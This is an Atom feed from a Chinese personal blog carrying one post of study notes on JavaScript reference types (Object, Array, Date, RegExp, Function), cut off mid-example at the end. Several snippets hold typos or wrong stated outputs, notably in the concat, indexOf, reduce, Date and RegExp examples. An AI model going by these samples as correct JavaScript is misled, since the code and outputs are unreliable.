<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>团子的代码作坊</title>
  
  <subtitle>心有猛兽、细嗅蔷薇</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dangoying.ink/"/>
  <updated>2019-06-25T15:11:35.152Z</updated>
  <id>http://dangoying.ink/</id>
  
  <author>
    <name>Dango</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JS引用类型</title>
    <link href="http://dangoying.ink/JS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html"/>
    <id>http://dangoying.ink/JS引用类型.html</id>
    <published>2019-06-17T13:35:13.000Z</published>
    <updated>2019-06-25T15:11:35.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>引用类型的值（对象）是引用类型的一个实例。<br>引用类型是一种数据结构，用于将数据和功能组织在一起。</p><h2 id="Object类型"><a href="#Object类型" class="headerlink" title="Object类型"></a>Object类型</h2><h3 id="创建方式："><a href="#创建方式：" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用new操作符后跟Object构造函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var person = new Object();   //与 var person = &#123;&#125; 等同</span><br><span class="line">person.name = &quot;Nicholas&quot;;</span><br><span class="line">person.age = 29;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>使用对象字面量表示法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name : &quot;Nicholas&quot;,</span><br><span class="line">    age : 29  //在最后一个属性后面添加逗号，会在IE7及更早版本的Opera中导致错误</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="访问属性："><a href="#访问属性：" class="headerlink" title="访问属性："></a>访问属性：</h3><p>使用点表示法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person.name);</span><br></pre></td></tr></table></figure></p><p>使用方括号语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person[&quot;name&quot;]);</span><br></pre></td></tr></table></figure></p><p>使用方括号访问的优点：</p><ul><li>可以通过变量来访问</li><li>如果属性名中包含会导致错误语法的字符，或使用关键字，保留字，可以用方括号</li></ul><p>除非必须使用变量来访问属性，否则我们建议使用点表示法。</p><h2 id="Array类型"><a href="#Array类型" class="headerlink" title="Array类型"></a>Array类型</h2><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><p>ECMAScript数组的每一项可以保存在任何类型的数据<br>ECMAScript数组的大小是可以动态调整的</p><h3 id="创建方式：-1"><a href="#创建方式：-1" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用Array构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array(3);</span><br><span class="line">var colors = new Array(&quot;Greg&quot;);</span><br></pre></td></tr></table></figure></p><p>使用数组字面量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br></pre></td></tr></table></figure></p><h3 id="读取方式和设置数组："><a href="#读取方式和设置数组：" class="headerlink" title="读取方式和设置数组："></a>读取方式和设置数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors[[0]]);</span><br><span class="line">colors[2] = &quot;black&quot;;</span><br></pre></td></tr></table></figure><h3 id="检测数组："><a href="#检测数组：" class="headerlink" title="检测数组："></a>检测数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(Array.isArray(value))&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="转换方法："><a href="#转换方法：" class="headerlink" title="转换方法："></a>转换方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors.toString());   //red,blue,green</span><br><span class="line">alert(colors.valueOf());    //red,blue,green</span><br><span class="line">alert(colors);              //red,blue,green</span><br><span class="line">alert(colors.join(&quot;,&quot;));    //red,blue,green</span><br><span class="line">alert(colors.join(&quot;||&quot;));   //red||blue||green</span><br></pre></td></tr></table></figure><h3 id="栈方法："><a href="#栈方法：" class="headerlink" title="栈方法："></a>栈方法：</h3><p>栈是一种LIFO(Last-In-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);   //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);   //3</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);    //&quot;black&quot;</span><br></pre></td></tr></table></figure></p><h3 id="队列方法："><a href="#队列方法：" class="headerlink" title="队列方法："></a>队列方法：</h3><p>队列是一种FIFO(First-in-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);     //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);     //3</span><br><span class="line">var item = colors.shift();</span><br><span class="line">alert(item);      //red</span><br><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.unshift(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">count = colors.unshift(&quot;black&quot;);</span><br><span class="line">alert(colors);    //black,red,green</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);      //green</span><br></pre></td></tr></table></figure></p><h3 id="重排序方法："><a href="#重排序方法：" class="headerlink" title="重排序方法："></a>重排序方法：</h3><h4 id="function-reverse"><a href="#function-reverse" class="headerlink" title="function reverse:"></a>function reverse:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values= [1,2,3,4,5];</span><br><span class="line">values.reverse();</span><br><span class="line">alert(values);   //5,4,3,2,1</span><br></pre></td></tr></table></figure><h4 id="function-sort"><a href="#function-sort" class="headerlink" title="function sort:"></a>function sort:</h4><p>在执行sort方法前，会先调用toString()转型，然后比较得到字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values = [0,1,5,10,15];</span><br><span class="line">values.sort();</span><br><span class="line">alert(values);   //0,1,10,15,5</span><br></pre></td></tr></table></figure></p><p>添加比较函数，如果第一个参数应该位于第二个参数前，返回负数，否则返回正数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;</span><br><span class="line">    if(value1 &lt; value2)&#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(value1 &gt; value2)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">values.sort(compare);  //0,1,5,10,15</span><br></pre></td></tr></table></figure></p><p>数值类型可以用更简单的比较函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;   //升序</span><br><span class="line">    return value1 - value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h3><h4 id="function-concat"><a href="#function-concat" class="headerlink" title="function concat:"></a>function concat:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var colors = colors.concat(&quot;yellow&quot;,[&quot;black&quot;,&quot;brown&quot;]);</span><br><span class="line">alert(colors);    //red,green,blue</span><br><span class="line">alert(colors2);   //red,green,blue,yellow,black,brown</span><br></pre></td></tr></table></figure><p>这个方法会先创建当前数组的一个副本，然后将接收的参数添加到这个副本的末尾，最后返回新构建的数组</p><h4 id="function-slice"><a href="#function-slice" class="headerlink" title="function slice:"></a>function slice:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;,&quot;purple&quot;];</span><br><span class="line">var colors2 = colors.slice(1);</span><br><span class="line">var colors3 = colors.slice(1,4);</span><br><span class="line">alert(colors2);   //green,blue,yellow,purple</span><br><span class="line">alert(colors3);   //green,blue,yellow</span><br></pre></td></tr></table></figure><p>能够基于当前数组中的一或多个项创建一个新数组，slice方法不会影响原始数组</p><h4 id="function-splice"><a href="#function-splice" class="headerlink" title="function splice:"></a>function splice:</h4><p>删除、插入、替换，用于向数组中部插入项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var removed = colors.splice(0,1);   //删除一项</span><br><span class="line">alert(colors);    //green,blue</span><br><span class="line">alert(removed);   //red</span><br><span class="line">removed = colors.splice(1,0,&quot;yellow&quot;,&quot;orange&quot;);   //插入两项</span><br><span class="line">alert(colors);    //green,yellow,orange,blue</span><br><span class="line">alert(removed);   //空数组</span><br><span class="line">removed = colors.splice(1,1,&quot;red&quot;,&quot;purple&quot;);   //替换一项，插入一项</span><br><span class="line">alert(colors);   //green,red,purple,orange,blue</span><br><span class="line">alert(removed);  //yellow</span><br></pre></td></tr></table></figure></p><h3 id="位置方法："><a href="#位置方法：" class="headerlink" title="位置方法："></a>位置方法：</h3><h4 id="function-indexOf"><a href="#function-indexOf" class="headerlink" title="function indexOf:"></a>function indexOf:</h4><p>从数组的开头开始向后查找，比较时会使用全等操作符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.indexoOf(4));   //3</span><br><span class="line">alert(numbers.indexOf(4,4))   //第一参数表示要查找的项，第二参数表示查找起始位置</span><br><span class="line">var person = &#123;name:&quot;Nicholas&quot;&#125;;</span><br><span class="line">var people = [&#123;name:&quot;Nicholas&quot;&#125;];</span><br><span class="line">var morePeople = [person];</span><br><span class="line">alert(people.indexOf(person));   //-1</span><br><span class="line">alert(morePeople.indexOf(person));  //0</span><br></pre></td></tr></table></figure></p><h4 id="function-lastIndexOf"><a href="#function-lastIndexOf" class="headerlink" title="function lastIndexOf:"></a>function lastIndexOf:</h4><p>从数组的末尾开始向前查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.lastIndexOf(4));   //5</span><br><span class="line">alert(numbers.lastIndexOf(4,4));   //3</span><br></pre></td></tr></table></figure></p><h3 id="迭代方法："><a href="#迭代方法：" class="headerlink" title="迭代方法："></a>迭代方法：</h3><h4 id="function-every"><a href="#function-every" class="headerlink" title="function every:"></a>function every:</h4><p>对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var everyResult = numbers.every(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(everyResult);  //false</span><br></pre></td></tr></table></figure></p><h4 id="function-filter"><a href="#function-filter" class="headerlink" title="function filter:"></a>function filter:</h4><p>对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(filterResult);  //[3,4,5,4,3]</span><br></pre></td></tr></table></figure></p><h4 id="function-forEach"><a href="#function-forEach" class="headerlink" title="function forEach:"></a>function forEach:</h4><p>对数组中的每一项运行给定函数，这个方法没有返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="function-map"><a href="#function-map" class="headerlink" title="function map:"></a>function map:</h4><p>对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var mapResult = numbers.map(function(item,index,array)&#123;</span><br><span class="line">    return item*2;</span><br><span class="line">&#125;);</span><br><span class="line">alert(mapResult);  //[2,4,6,8,10,8,6,4,2]</span><br></pre></td></tr></table></figure></p><h4 id="function-some"><a href="#function-some" class="headerlink" title="function some:"></a>function some:</h4><p>对数组中的每一项运行给定函数，如果该函数对任一项返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var someResult = numbers.some(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(someResult);  //true</span><br></pre></td></tr></table></figure></p><h3 id="缩小方法（归并方法）："><a href="#缩小方法（归并方法）：" class="headerlink" title="缩小方法（归并方法）："></a>缩小方法（归并方法）：</h3><h4 id="function-reduce"><a href="#function-reduce" class="headerlink" title="function reduce:"></a>function reduce:</h4><p>接收4个参数：前一个值，当前值，项的索引值和数组对象，这个函数中返回的任何值都会作为第一个参数自动传给下一项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum - values.reduce(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h4 id="function-reduceRight"><a href="#function-reduceRight" class="headerlink" title="function reduceRight:"></a>function reduceRight:</h4><p>与reduce相似，只是从数组最后一项开始，向前遍历<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum = values.reduceRight(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h2 id="Date类型"><a href="#Date类型" class="headerlink" title="Date类型"></a>Date类型</h2><h3 id="构造函数："><a href="#构造函数：" class="headerlink" title="构造函数："></a>构造函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var nom = new Date();</span><br><span class="line">var now = new Date.parse(&quot;YYYY-MM-DD&quot;);   //2019-02-19</span><br><span class="line">var now = new Date(Date.UTC(2015,4,5,17,55,55));  //2015/4/5 17:55:55</span><br><span class="line">var start = Date.now();  //获取毫秒数</span><br></pre></td></tr></table></figure><h3 id="继承方法："><a href="#继承方法：" class="headerlink" title="继承方法："></a>继承方法：</h3><p>不同浏览器对toLocaleString(),toString()和valueOf()方法解释不同</p><h3 id="日期格式化方法："><a href="#日期格式化方法：" class="headerlink" title="日期格式化方法："></a>日期格式化方法：</h3><p>toDateString()：以特定于实现的格式显示星期几、月、日和年<br>toTimeString()：以特定于实现的格式显示时分秒和时区<br>toLocaleDateString()：以特定于地区的格式显示星期几、日、月、年<br>toLocaleTimeString()：以特定于地区的格式显示时分秒<br>toUTCString()：以特定于实现的格式完整的UTC日期</p><h3 id="日期-时间组件方法："><a href="#日期-时间组件方法：" class="headerlink" title="日期/时间组件方法："></a>日期/时间组件方法：</h3><p>getTime()：返回表示日期的毫秒数<br>getFullyYear()：取得4位数的年份<br>getMonth()：返回日期中的月份，0-11表示1月至12月<br>getDate()：返回日期月份中的天数(1-31)<br>getDay()：返回日期中星期的星期几(0-6)表示，星期日至星期六<br>getHours()：返回日期中的小时数(0-23)</p><h2 id="RegExp类型"><a href="#RegExp类型" class="headerlink" title="RegExp类型"></a>RegExp类型</h2><h3 id="基础语法："><a href="#基础语法：" class="headerlink" title="基础语法："></a>基础语法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var expression = /pattern/flags;</span><br></pre></td></tr></table></figure><p>pattern部分：可以是任何简单或复杂的正则表达式<br>flags部分：每个正则表达式都可带有1或多个标志</p><blockquote><p>g：表示全局模式，即模式将被应用于所有字符串<br>i：标识区分大小写模式，即在确定匹配项时忽略模式与字符串的大小写<br>m：表示多行模式，即在到达一行文本末尾时还会继续查找下一行是否存在与模式匹配的项</p></blockquote><p>与其他语言中的正则表达式类似，模式中使用的所有元字符都必须转义:([(\^$|)?*+.])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pattern = /[bc]at/i;</span><br><span class="line">var pattern2 = new RegExp(&quot;[bc]at&quot;,&quot;i&quot;);</span><br></pre></td></tr></table></figure></p><p>在ECMAScript中，正则表达式字面量始终会共享同一个RegExp实例，而使用构造函数创建的每一个新RegExp实例都是一个新实例</p><h3 id="RegExp实例属性："><a href="#RegExp实例属性：" class="headerlink" title="RegExp实例属性："></a>RegExp实例属性：</h3><p>global：布尔值，表示是否设置了g标志<br>ignoreCase：布尔值，表示是否设置了i标志<br>lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从0算起<br>multiline：布尔值，表示是否设置了m标志<br>source：正则表达式的字符串表示，按照字面量形式而传入构造函数中的字符串模式返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var pattern1 = /\[bc\]at/i;</span><br><span class="line">alert(pattern1.global);   //false</span><br><span class="line">alert(pattern1.ignoreCase);   //true</span><br><span class="line">alert(pattern1.multiline);   //false</span><br><span class="line">alert(pattern1.lastIndex);   //0</span><br><span class="line">alert(pattern1.source);   //&quot;\[bc\]at&quot;</span><br></pre></td></tr></table></figure></p><h3 id="RegExp实例方法："><a href="#RegExp实例方法：" class="headerlink" title="RegExp实例方法："></a>RegExp实例方法：</h3><h4 id="function-exec"><a href="#function-exec" class="headerlink" title="function exec:"></a>function exec:</h4><p>专门为捕获组而设计，返回包含第一个匹配信息的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;mom and dad and baby&quot;;</span><br><span class="line">var pattern = /mom(and dad(and baby)?)?/gi;</span><br><span class="line">var matches = pattern.exec(text);</span><br><span class="line">alert(matches.index);  //0</span><br><span class="line">alert(matches.input);  //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[0]);   //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[1]);   //&quot;and dad and baby&quot;</span><br><span class="line">alert(matches[2]);   //&quot;and baby&quot;</span><br></pre></td></tr></table></figure></p><h4 id="function-test"><a href="#function-test" class="headerlink" title="function test:"></a>function test:</h4><p>接受一个字符串参数，在模式与该参数匹配的情况下返回true，否则，返回false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;000-000-0000&quot;;</span><br><span class="line">var pattern = /\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;/;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(&quot;The pattern was matched&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-toLocaleString-和toString"><a href="#function-toLocaleString-和toString" class="headerlink" title="function toLocaleString()和toString():"></a>function toLocaleString()和toString():</h4><p>返回正则表达式的字面量，与创建正则表达式的方式无关</p><h3 id="构造函数属性："><a href="#构造函数属性：" class="headerlink" title="构造函数属性："></a>构造函数属性：</h3><p>input：返回最近一次要匹配的字符串<br>leftContext：返回input字符串中lastMatch之前的文本<br>lastMatch：返回最近一次的匹配项<br>lastParen：返回最近一次匹配的捕获组<br>multiline：布尔值，表示是否所有表达式都是用多行模式<br>rightContext：input字符串中lastMatch之后的文本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;this has been a short summer&quot;;</span><br><span class="line">var patern = /(:)hort/g;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(RegExp.input);   //this has been a short summer</span><br><span class="line">    alert(RegExp.rightContext);   //this has been a </span><br><span class="line">    alert(RegExp.lastMatch);   //short</span><br><span class="line">    alert(RegExp.lastParen);   //s</span><br><span class="line">    alert(RegExp.multiline);   //false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="模式的局限性："><a href="#模式的局限性：" class="headerlink" title="模式的局限性："></a>模式的局限性：</h3><p>ECMAScript不支持的特性：</p><blockquote><p>匹配字符串开始和结尾的\A和\Z锚<br>向后查找<br>并集和交集类<br>原子组<br>Unicode支持<br>命名的捕获组<br>s(single，单行)和x(free-spacing，无间隔)匹配模式<br>条件匹配<br>正则表达式注释</p></blockquote><h2 id="Function类型"><a href="#Function类型" class="headerlink" title="Function类型"></a>Function类型</h2><h3 id="定义方式："><a href="#定义方式：" class="headerlink" title="定义方式："></a>定义方式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">var sum = function(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="没有重载："><a href="#没有重载：" class="headerlink" title="没有重载："></a>没有重载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function addNumber(num)&#123;</span><br><span class="line">    return num + 100;</span><br><span class="line">&#125;</span><br><span class="line">funciton addNumber(num)&#123;</span><br><span class="line">    return num + 200;</span><br><span class="line">&#125;</span><br><span class="line">var result = addNumber(100);   //300</span><br></pre></td></tr></table></figure><h3 id="函数声明与函数表达式："><a href="#函数声明与函数表达式：" class="headerlink" title="函数声明与函数表达式："></a>函数声明与函数表达式：</h3><p>解析器会率先读取函数声明，并使其在执行任何代码之前可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(sum(0,10));</span><br><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="作为值的函数："><a href="#作为值的函数：" class="headerlink" title="作为值的函数："></a>作为值的函数：</h3><p>可以像传递参数一样把一个函数传递给另一个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function callSomeFunction(someFunction,someArgument)&#123;</span><br><span class="line">    return someFunction(someArgument);</span><br><span class="line">&#125;</span><br><span class="line">function add10(num)&#123;</span><br><span class="line">    return num + 10;</span><br><span class="line">&#125;</span><br><span class="line">function greeting(name)&#123;</span><br><span class="line">    return &quot;Hello &quot; + name;</span><br><span class="line">&#125;</span><br><span class="line">var result = callSomeFunction(add10,10);</span><br><span class="line">alert(result);   //20</span><br><span class="line">var result2 = callSomeFunction(greeting,&quot;Van&quot;);</span><br><span class="line">alert(result2);   //&quot;Hello Van&quot;</span><br></pre></td></tr></table></figure></p><p>可以将一个函数作为另一个函数的结果返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparisonFunction(propertyName)&#123;</span><br><span class="line">    return function (object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="函数内部属性："><a href="#函数内部属性：" class="headerlink" title="函数内部属性："></a>函数内部属性：</h3><h4 id="callee"><a href="#callee" class="headerlink" title="callee:"></a>callee:</h4><p>一个指针，指向拥有这个arguments对象的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 